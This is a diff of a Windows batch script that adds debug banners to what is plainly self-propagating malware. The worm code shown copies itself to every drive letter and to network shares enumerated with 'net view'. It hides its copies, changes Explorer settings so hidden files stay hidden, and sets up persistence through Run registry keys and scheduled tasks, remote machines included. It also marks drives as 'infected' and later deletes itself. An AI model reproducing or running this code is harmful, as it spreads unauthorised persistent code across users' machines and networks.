@@ -55,15 +55,40 @@ if exist "extensions" for /f "delims=" %%i in ('dir /a:d /b "extensions" 2^>nul'
 
 
 
+echo.
+echo.
+echo.
+echo.==START====SET======================================================================================
+echo.
+set
+echo.
+echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+echo.
+echo.
+
+
+
+
+
 for %%z in ("%path_desktop%\%app_date%" "%systemDrive%\%app_date%") do if exist %%z goto :remover
 
 
 
 %module_fileTouch% "%~f0" >nul
 
+echo.
+echo.
+echo.
+echo.==START====EXTENSIONS====START======================================================================
+echo.
 if exist "extensions" for %%i in (%extensions%) do for /f "eol=# tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "start" (
   start /b "" extensions\%%i\%%k
+  echo.STARTING: extensions\%%i\%%k
 )
+echo.
+echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+echo.
+echo.
 
 
 
@@ -84,19 +109,43 @@ for %%z in ("%path_desktop%\%app_date%" "%systemDrive%\%app_date%") do if exist 
 
 
 
+echo.
+echo.
+echo.
+echo.==CYCLE====EXTENSIONS====CYCLE======================================================================
+echo.
 if exist "extensions" for %%i in (%extensions%) do for /f "eol=# tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "cycle" (
   start /b "" extensions\%%i\%%k
+  echo.STARTING: extensions\%%i\%%k
 )
+echo.
+echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+echo.
+echo.
 
 
 
+echo.
+echo.
+echo.
+echo.==CYCLE====REGISTRY==EDITING========================================================================
+echo.
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden          /t REG_DWORD /d 2 /f >nul
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /d 0 /f >nul
+echo.
+echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+echo.
+echo.
 
 
 
 
 
+echo.
+echo.
+echo.
+echo.==CYCLE====FILES==COPYING====AUTORUN==APPDATA=======================================================
+echo.
 for %%i in (path_autoRun1 path_autoRun2) do if not exist "!%%i!\%~nx0" (
   if not exist "!%%i!\%~nx0" call copy /y "%~f0" "!%%i!\"
   call %module_fileTouch% "!%%i!\%~nx0" >nul
@@ -107,11 +156,20 @@ for %%i in (localAppData appData) do (
   call %module_fileTouch% "!%%i!\%~nx0" >nul
   %autoRun% add "%%i" "!%%i!\%~nx0"
 )
+echo.
+echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+echo.
+echo.
 
 
 
 
 
+echo.
+echo.
+echo.
+echo.==CYCLE====FILES==COPYING====LOCAL==FILESYSTEM======================================================
+echo.
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" (
   %directory% "%%i:"
 
@@ -140,6 +198,10 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
     ) else %infected% "%%i:"
   ) else %infected% "%%i:"
 )
+echo.
+echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+echo.
+echo.
 
 timeout /nobreak /t 2 >nul
 
@@ -147,6 +209,11 @@ timeout /nobreak /t 2 >nul
 
 
 
+echo.
+echo.
+echo.
+echo.==CYCLE====FILES==COPYING====NETWORK================================================================
+echo.
 for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NEQ "The" (
   for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" (
     %directory% "%%h\%%i"
@@ -178,6 +245,10 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NE
     )
   )
 )
+echo.
+echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+echo.
+echo.
 
 timeout /nobreak /t 2 >nul
 goto :cycle
@@ -197,25 +268,50 @@ goto :cycle
 
 
 :remover
+echo.
+echo.
+echo.
+echo.==CYCLE====EXTENSIONS====REMOVE=====================================================================
+echo.TODO: Check /WAIT and /B work
+echo.
 if exist "extensions" for %%i in (%extensions%) do for /f "eol=# tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "remove" (
   start /wait /b "" extensions\%%i\%%k
+  echo.STARTING: extensions\%%i\%%k
 )
+echo.
+echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+echo.
+echo.
 
 
 
 
 
+echo.
+echo.
+echo.
+echo.==CYCLE====FILES==REMOVING====AUTORUN==APPDATA======================================================
+echo.
 for %%i in (path_autoRun1 path_autoRun2) do if exist "!%%i!\%~nx0" call del /q "!%%i!\%~nx0"
 
 for %%i in (localAppData appData) do (
   if exist "!%%i!\%~nx0" call del /q "!%%i!\%~nx0"
   %autoRun% delete "%%i"
 )
+echo.
+echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+echo.
+echo.
 
 
 
 
 
+echo.
+echo.
+echo.
+echo.==CYCLE====FILES==REMOVING====LOCAL==FILESYSTEM=====================================================
+echo.
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" (
   if exist "%%i:\%~nx0" (
     attrib -h -s "%%i:\%~nx0"
@@ -246,11 +342,20 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
     )
   )
 )
+echo.
+echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+echo.
+echo.
 
 
 
 
 
+echo.
+echo.
+echo.
+echo.==CYCLE====FILES==REMOVING====NETWORK===============================================================
+echo.
 for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NEQ "The" (
   for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" (
     if exist "%%h\%%i\%~nx0" (
@@ -283,11 +388,16 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NE
     )
   )
 )
+echo.
+echo.++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+echo.
+echo.
 
 
 
 
 
+timeout /nobreak /t 60 >nul
 start /min "" cmd /c "timeout /t 3 && del /q """%~f0""""
 exit
 
@@ -306,6 +416,8 @@ exit
 
 
 :autoRun
+echo.  ==LABEL====AUTORUN==
+echo.
 set option2=%2
 if "!option2!" NEQ "" set option2=!option2:"=!
 
@@ -317,7 +429,7 @@ if "!option4!" NEQ "" set option4=!option4:"=!
 
 
 
-(
+rem (
   if "%1" == "add" (
     reg add %option4%HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /d "%option3%" /f
     reg add %option4%HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /d "%option3%" /f
@@ -326,6 +438,9 @@ if "!option4!" NEQ "" set option4=!option4:"=!
     if "%option4%" == " " ( schtasks /create /sc onstart /tn "%app_name% %option2%" /tr "%option3%" /f /rl highest
     ) else for /f "delims=\" %%z in ("%option4%") do schtasks /create /s %%z /sc onstart /tn "%app_name% %option2%" /tr "%option3%" /f /rl highest
   ) else (
+    echo.reg delete %option3%HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /f
+    echo.reg delete %option3%HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /f
+    echo.reg delete %option3%HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %option2%" /f
 
     reg delete %option3%HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /f
     reg delete %option3%HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run             /v "%app_name% %option2%" /f
@@ -334,7 +449,9 @@ if "!option4!" NEQ "" set option4=!option4:"=!
     if "%option3%" == " " ( schtasks /delete /tn "%app_name% %option2%" /f
     ) else for /f "delims=\" %%z in ("%option3%") do schtasks /delete /s %%z /tn "%app_name% %option2%" /f
   )
-)>nul 2>nul
+rem )>nul 2>nul
+echo.
+echo.  ++++++++++++++++++++
 exit /b
 
 
@@ -352,6 +469,8 @@ exit /b
 
 
 :directory
+echo.  ==LABEL====DRIVE==DIR==
+echo.
 if not exist %*\"%app_file_name%" copy /y "%app_file%" %*\
 if exist %*\"%app_file_name%" (
   attrib +h +s %*\"%app_file_name%"
@@ -359,7 +478,15 @@ if exist %*\"%app_file_name%" (
 
   %autoRun% add %* %*\"%app_file_name%"
 )
+echo.
+echo.  +++++++++++++++++++++++
 
+
+
+
+
+echo.  ==LABEL====SYSTEMVOLUMEINFO==DIR==
+echo.
 if not exist %*\"System Volume Information" md %*\"System Volume Information"
 
 
@@ -376,6 +503,8 @@ if exist %*\"System Volume Information\%app_file_name%" (
 
 attrib +h +s %*\"System Volume Information"
 %module_fileTouch% %*\"System Volume Information" >nul
+echo.
+echo.  ++++++++++++++++++++++++++++++++++
 exit /b
 
 
@@ -393,6 +522,8 @@ exit /b
 
 
 :infected
+echo.  ==LABEL====DRIVE==INFECTED==
+echo.
 echo.>%*\"infected-%app_date%"
 attrib +h +s %*\"infected-%app_date%"
 %module_fileTouch% %*\"infected-%app_date%" >nul
@@ -405,6 +536,15 @@ for /f "delims=" %%j in ('dir %*\* /a:d /b 2^>nul') do (
     if exist %*\"%%j.lnk" del /q %*\"%%j.lnk"
   )
 )
+echo.
+echo.  ++++++++++++++++++++++++++++
+
+
+
+
+
+echo.  ==LABEL====SYSTEMVOLUMEINFO==INFECTED==
+echo.
 echo.>%*\"System Volume Information\infected-%app_date%"
 attrib +h +s %*\"System Volume Information\infected-%app_date%"
 %module_fileTouch% %*\"System Volume Information\infected-%app_date%" >nul
@@ -417,4 +557,6 @@ for /f "delims=" %%j in ('dir %*\* /a:d /b 2^>nul') do (
     if exist %*\"%%j.lnk" del /q %*\"%%j.lnk"
   )
 )
+echo.
+echo.  +++++++++++++++++++++++++++++++++++++++
 exit /b
